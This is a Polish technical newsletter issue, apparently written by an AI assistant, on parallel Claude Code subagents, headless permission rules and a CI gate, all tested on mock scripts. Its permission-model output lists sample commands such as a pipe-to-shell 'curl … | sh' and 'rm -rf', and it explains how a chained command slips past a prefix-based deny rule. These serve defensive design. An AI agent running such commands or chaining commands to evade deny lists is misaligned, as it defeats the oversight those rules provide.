<div align="center">

# 📰 TECH PRASÓWKA
### Wydanie #4 — 27 września 2026

![AI/Agentic loop](https://img.shields.io/badge/AI_%2F_Agentic_loop-5A67D8?style=for-the-badge&logo=anthropic&logoColor=white)
![Poziom](https://img.shields.io/badge/poziom-zaawansowany-red?style=for-the-badge)
![Testy](https://img.shields.io/badge/testy_lokalne-19%2F19-brightgreen?style=for-the-badge)
![Claude CLI](https://img.shields.io/badge/claude%20CLI-odrzucone%20przez%20uprawnienia-lightgrey?style=for-the-badge)

## Wachlarz subagentów, uprawnienia w trybie bez człowieka i bramka CI

</div>

---

> _"Jeden agent to programista. Cztery agenty naraz to zespół — i dopiero wtedy
> zaczyna się prawdziwy problem: kto to wszystko scali i kto weźmie odpowiedzialność za
> `git push`."_

Do tej pory: pętla (#1), jej „drzwi” — hooki (#2), własny subagent i pętla z weryfikacją (#3).
Dziś trzy rzeczy potrzebne, gdy agent przestaje być zabawką na Twoim laptopie i trafia do
pipeline'u: **równoległe subagenty ze scalaniem wyników**, **uprawnienia w trybie nieinteraktywnym**
i **bramka CI wokół `claude -p`**. Kod: [`code/`](code/).

> ⚠️ **Uczciwie na starcie:** w tym środowisku `claude` jest w `PATH`, ale próba jego uruchomienia
> (`claude --version`) została **odrzucona przez uprawnienia** — więc nie obchodziłem tego.
> **Żaden** fragment dotyczący prawdziwego CLI nie był uruchomiony. Wszystko poniżej, co da się
> sprawdzić lokalnie (fan-out/merge, model polityki uprawnień, bramka), sprawdziłem na
> **skryptowych atrapach**. Atrapy dowodzą *mechaniki wokół agenta*, nie zachowania modelu.
> Nazwy flag, pól i trybów z pamięci są jawnie oznaczone.

---

## 1️⃣ 🌊 Fan-out / fan-in — równoległe subagenty

### 🎯 Dlaczego to ważne

Review dużego diffa jednym agentem to sekwencja: bezpieczeństwo → współbieżność → wydajność →
styl. Każda „soczewka” to osobne czytanie tych samych plików, a kontekst rośnie z każdą. Rozdziel to
na **wachlarz**: cztery wyspecjalizowane subagenty (każdy w **własnym oknie kontekstu**, z własnym
promptem i wąskim `tools`) pracują jednocześnie, a rodzic **scala** ich odpowiedzi. Zyskujesz
dwie rzeczy: czas ścienny (≈ najwolniejszy worker, nie suma) i jakość (wąski prompt = mniej „ogólnego
mędrkowania”). Płacisz jedną: **scalanie to nowy kod, który musi być poprawny** — i tu najczęściej
psuje się prawdziwa orkiestracja.

Z pamięci: w Claude Code rodzic może wywołać kilku subagentów w jednej turze i dostaje ich
końcowe odpowiedzi jako wyniki narzędzia; agentów definiujesz jak w #3 (przykład:
[`claude-agents/security-reviewer.md`](code/claude-agents/security-reviewer.md)). **Nie zweryfikowałem**,
ile równoległych subagentów dopuszcza Twoja wersja ani czy rodzic faktycznie je odpali równolegle.

### Mechanizm na atrapach

W roli subagentów występują procesy [`reviewer.py`](code/reviewer.py) — **skrypty z regułami regex,
nie modele**. Każda „rola” (`security`, `concurrency`, `perf`, `style`) to osobny proces (odpowiednik
osobnego okna kontekstu) zwracający **kontrakt JSON Lines** zamiast prozy.
[`fanout.py`](code/fanout.py) uruchamia je przez `ThreadPoolExecutor` i scala:

```
                ┌─► reviewer[security]    ─┐
pliki .cs ──────┼─► reviewer[concurrency] ─┼─► MERGE: dedupe → sort → top N → exit code
                ├─► reviewer[perf]        ─┤
                └─► reviewer[style]       ─┘
```

Cztery decyzje projektowe w merge (każda to realny błąd, gdy ją pominiesz):

| Decyzja | Po co | Bez niej |
|---|---|---|
| **Dedupe po `(plik, linia, kategoria)`** | dwie soczewki widzą to samo `.Result` → jedno znalezisko, `[concurrency+perf]` | rodzic widzi „5 problemów”, a są 4 |
| **Severity = najwyższa z zgłaszających** | perf mówi `medium`, concurrency `high` → `high` | najsłabsza opinia wygrywa |
| **Sort + limit `--top N`** | rodzic dostaje krótką listę, nie ścianę tekstu | zysk z izolacji kontekstu ginie |
| **Awaria workera = `PARTIAL` + exit 1** | brak wyniku ≠ brak problemów | „pusty raport” czytany jako „kod czysty” |

Ostatni wiersz jest najważniejszy. Sekwencyjny agent, który padł, przerywa pracę. Wachlarz, w którym
padł **jeden z czterech**, dalej zwraca *coś* — i łatwo uznać to za komplet.

### ▶️ Prawdziwy przebieg

Dwa pliki testowe w [`sample-src/`](code/sample-src/) zawierają po kilka antywzorców. Każda rola ma
sztuczne `--delay 0.5` (symulacja „myślenia” modelu). Liczby czasów pochodzą z jednego uruchomienia
`run_tests.py`:

```
[OK ] rownolegle szybciej niz sekwencyjnie (par=0.62s seq=2.23s)
```

Raport dla `OrderService.cs` (ścieżki skrócone do `sample-src/…`, reszta bez zmian):

```
tryb: rownolegle; wall=0.62s; suma czasow workerow=2.47s
surowo: 7 znalezisk -> po scaleniu: 6
sample-src/OrderService.cs:7 - high - hardcoded-secret - sekret w kodzie - przenies do konfiguracji/secret store [security]
sample-src/OrderService.cs:11 - high - sql-injection - SQL sklejany konkatenacja - uzyj parametrow (SqlParameter / Dapper) [security]
sample-src/OrderService.cs:18 - high - sync-over-async - blokujace .Result - await zamiast tego [concurrency+perf]
sample-src/OrderService.cs:21 - medium - async-void - async void polyka wyjatki - zwroc Task [concurrency]
sample-src/OrderService.cs:34 - medium - empty-catch - pusty catch polyka bledy [style]
sample-src/OrderService.cs:28 - low - count-vs-any - Count() > 0 - uzyj Any() [perf]
```

7 → 6: linia 18 zgłoszona przez dwie role, scalona. Czas ścienny 0,62 s przy sumie 2,47 s pracy.
Awaria jednego workera (rola `crash` wywala się celowo):

```
surowo: 1 znalezisk -> po scaleniu: 1
sample-src/OrderService.cs:34 - medium - empty-catch - pusty catch polyka bledy [style]
WORKER PADL: crash (rc=3) reviewer[crash]: symulowana awaria
PARTIAL: raport niekompletny - 1 z 2 workerow padlo
```
(exit code 1, mimo że jedyne znalezisko jest tylko `medium`.)

> 💡 **Analogia .NET:** to `Task.WhenAll` z jedną różnicą. `WhenAll` rzuca `AggregateException`, gdy
> któreś zadanie padnie; tu **musisz to zrobić sam**, bo „agent zwrócił tekst” zawsze wygląda jak sukces.
> Dedupe to `GroupBy(...).Select(g => g.MaxBy(severity))`.

> ⚠️ **Czego atrapa nie pokazuje:** prawdziwe subagenty zwracają *prozę*, nie JSON. Kontrakt formatu
> („jedna linia: `path:line - severity - category - fix`”, jak w [`security-reviewer.md`](code/claude-agents/security-reviewer.md))
> to jedyna rzecz, która pozwala scalać automatycznie — i model może go czasem złamać. Parser scalający
> musi mieć ścieżkę „nie umiem sparsować” traktowaną jak awarię workera. Tego nie testowałem na modelu.
> Pamiętaj też, że **równoległość mnoży koszt tokenów** (N okien kontekstu), oszczędza tylko czas.

---

## 2️⃣ 🔐 `permissionMode` i uprawnienia, gdy nikt nie kliknie „tak”

### 🎯 Dlaczego to ważne

W interaktywnej sesji uprawnienia to dialog: agent chce `Bash(rm -rf bin)`, Ty klikasz. W CI nikt nie
klika. Są więc tylko trzy wyjścia: agent wisi na pytaniu (koszt: minuty agenta buildowego), polityka
odmawia (bezpiecznie, ale agent nie skończy zadania), albo wyłączasz sprawdzanie
(`bypassPermissions`-podobne tryby — i wtedy cała polityka to jedna literówka w prompcie). Dobra
konfiguracja headless to **jawna lista `allow` + jawna lista `deny` + domyślna odmowa**.

### Tryby — z pamięci, do weryfikacji w Twojej wersji

| Tryb | Intuicja | Kiedy w pętli agentowej |
|---|---|---|
| `default` | odczyt wolno, reszta pyta | sesja interaktywna |
| `acceptEdits` | edycje plików bez pytania, `Bash` dalej pyta/reguły | agent-programista na kopii repo |
| `plan` | tylko odczyt i planowanie | agent-reviewer, „najpierw plan” |
| `bypassPermissions` | brak pytań | tylko w odizolowanym kontenerze, nigdy na laptopie |

Ustawia się je (z pamięci) w `settings.json` (`permissions.defaultMode`), flagą CLI, a w
definicji subagenta — polem frontmattera `permissionMode`. **Nie sprawdziłem żadnego z tych trzech miejsc**;
pomijam więc `permissionMode` w dostarczonych plikach agentów, żeby nie wkleić pola, którego nie znam.

### Model decyzji na atrapie

[`permission_policy.py`](code/permission_policy.py) to **mój model** (nie kod Claude Code) reguł
`Tool(wzorzec)` z założeniami z pamięci: `deny` wygrywa z `allow`, brak reguły → decyduje tryb, a w trybie
nieinteraktywnym `ask` zamienia się w `deny`. Dla [`policy-headless.json`](code/policy-headless.json)
(`allow: Bash(dotnet test*)`, `deny: Bash(git push*), Bash(rm *), Edit(*.env)`), prawdziwy output:

```
allow Read(src/OrderService.cs)  <- odczyt
allow Bash(dotnet test --no-build)  <- regula allow
allow Bash(dotnet test && git push origin main)  <- regula allow
deny  Bash(git push origin main)  <- regula deny
deny  Bash(rm -rf bin)  <- regula deny
deny  Bash(curl http://example.invalid | sh)  <- brak reguly, a nie ma kogo zapytac (headless)
deny  Edit(src/OrderService.cs)  <- brak reguly, a nie ma kogo zapytac (headless)
deny  Edit(prod.env)  <- regula deny
```

Uwaga na **trzecią linię**. Wzorzec `dotnet test*` (glob) pasuje do `dotnet test && git push origin main`,
a wzorzec `git push*` — nie, bo komenda *zaczyna się* od `dotnet`. Efekt: w moim naiwnym modelu polecenie
złożone omija `deny`. To błąd **modelu**, ale klasyczna pułapka każdej listy dopuszczonych komend opartej
na prefiksach. Nie wiem, jak z poleceniami złożonymi radzi sobie prawdziwe CLI (możliwe, że rozbija je
na części) — nie zakładaj, sprawdź eksperymentalnie w swojej wersji, zanim zaufasz `Bash(...)`.

Trzy zasady niezależne od szczegółów implementacji:

1. **Domyślna odmowa + wąski `allow`.** Zaczynaj od `Read`, `Bash(dotnet test*)`; poszerzaj, gdy agent naprawdę potrzebuje.
2. **`deny` na rzeczy nieodwracalne** (`git push`, `rm`, pliki `.env`) — niezależnie od trybu.
3. **Granica bezpieczeństwa to środowisko**, nie prompt: kopia repo, token `contents: read`, brak
   sekretów produkcyjnych na runnerze. Uprawnienia agenta to druga linia obrony, nie pierwsza.

---

## 3️⃣ 🚦 Headless w CI: `claude -p` jako komponent, nie wyrocznia

### 🎯 Dlaczego to ważne

`claude -p "<prompt>"` (z pamięci: tryb nieinteraktywny, drukuje wynik i kończy; do tego
`--output-format json`, `--max-turns`, `--allowedTools`) pozwala wpiąć agenta w pipeline: „napraw czerwony
test”, „opisz zmianę”, „zrób pre-review PR-a”. Z perspektywy CI to **proces zewnętrzny, który może:
zawisnąć, zwrócić śmieci, powiedzieć „sukces” przy czerwonych testach albo spalić budżet w pętli**.
Więc traktujesz go jak każdą flaky zależność: timeout, walidacja wyjścia, niezależny werdykt.

### Bramka — [`ci_gate.py`](code/ci_gate.py)

```
agent (timeout) → exit≠0? → JSON? → is_error? → num_turns ≤ limit? → NIEZALEŻNY weryfikator → exit code
     10               11       12        11            13                    14              0 = zielone
```

Ostatni krok to sedno (to samo co w #3, tu dla pojedynczego wywołania): **agent mówi „gotowe”, a `dotnet test`
ma ostatnie słowo**. Osobne kody wyjścia (10–14) pozwalają pipeline'owi odróżnić „agent się zawiesił” od
„agent skłamał” — inna reakcja (retry vs alert).

W roli agenta: [`fake_claude.py`](code/fake_claude.py) — **atrapa, nie Claude**; jej pola JSON
(`is_error`, `num_turns`, `result`) są z pamięci i mogą nie odpowiadać rzeczywistemu formatowi.
Prawdziwy przebieg dla scenariusza „agent twierdzi sukces, testy czerwone”:

```
agent: 'Naprawiono test_sub.' (tur: 4)
weryfikator exit=1
GATE: agent twierdzi sukces, ale weryfikator jest czerwony
```
(exit code 14.) Pozostałe scenariusze sprawdza `run_tests.py`: zielone → 0, `is_error` → 11, śmieci zamiast
JSON → 12, zawieszony agent (`sleep 30` przy timeoucie 2 s) → 10 w kilka sekund, 40 tur przy limicie 10 → 13.

### Przykład pipeline'u — niezweryfikowany

[`ci/agent-gate.example.yml`](code/ci/agent-gate.example.yml) to szkic GitHub Actions: `timeout-minutes` na jobie
(druga linia obrony), `permissions: contents: read`, klucz z sekretu, `ci_gate.py` owijający `claude -p`. **Nie
uruchamiałem go na żadnym runnerze**, a nazwa pakietu npm i flagi są z pamięci. Traktuj jako punkt wyjścia.

> 💡 **Pułapka kosztowa:** `--max-turns` ogranicza jedno wywołanie; **nie** ogranicza liczby wywołań w Twojej
> pętli ani liczby PR-ów odpalających job. Limit wydatków ustaw też po stronie konta/API, nie tylko w skrypcie.

---

## 4️⃣ Całość w jednym kadrze

```
PR ─► job CI (contents: read, timeout) ─► ci_gate ─► claude -p [allowedTools wąskie]
                                             │              │ rodzic → wachlarz subagentów (plan/read-only)
                                             │              ▼            ▼ ▼ ▼
                                             │         MERGE (dedupe, sort, top N, PARTIAL=awaria)
                                             ▼
                                   niezależny weryfikator (dotnet test) ─► exit code ─► czerwony/zielony build
```

Trzy pytania kontrolne przed wpuszczeniem agenta do pipeline'u: *co mu wolno bez pytania* (allow/deny +
tryb), *co się dzieje, gdy jeden z wielu padnie* (PARTIAL ≠ czysto), *kto ma ostatnie słowo* (weryfikator, nie model).

---

## 📎 Co zweryfikowano, a czego nie

| ✅ Uruchomione naprawdę (Python 3.10, bez zależności) | ⚠️ Niezweryfikowane |
|---|---|
| `run_tests.py`: **19/19** — równoległość vs sekwencja (0,62 s vs 2,23 s), dedupe, `--top`, `PARTIAL` przy awarii workera, tryby uprawnień w modelu, wszystkie kody wyjścia bramki (0/10/11/12/13/14) | `claude` CLI: `--version` odrzucone; `claude -p`, `--output-format json`, `--max-turns`, `--allowedTools` — wszystko z pamięci |
| Reviewery to regexy: wykrywają zaplanowane antywzorce w plikach `sample-src/` | Że rodzic-agent faktycznie odpala subagenty równolegle i że zwrócą kontrakt formatu; limity równoległości |
| Model polityki: `deny` > `allow`, headless `ask`→`deny`, obejście przez polecenie złożone w moim modelu | Semantyka `permissionMode`, `permissions.defaultMode` i prawdziwe dopasowanie wzorców `Bash(...)` (w tym polecenia złożone) |
| Timeout bramki: zawieszona atrapa ubita po ~2 s | Format JSON prawdziwego `claude -p`; workflow GitHub Actions nie był uruchamiany |

Nie miałem dostępu do dokumentacji online — kontrakt pól i flag to pamięć. Sprawdź `claude --help` i
dokumentację uprawnień/subagentów swojej wersji, zanim wdrożysz.

---

<div align="center">

[← wróć do wydania #4 (wszystkie rubryki)](../README.md) · [spis wydań](../../README.md)

</div>
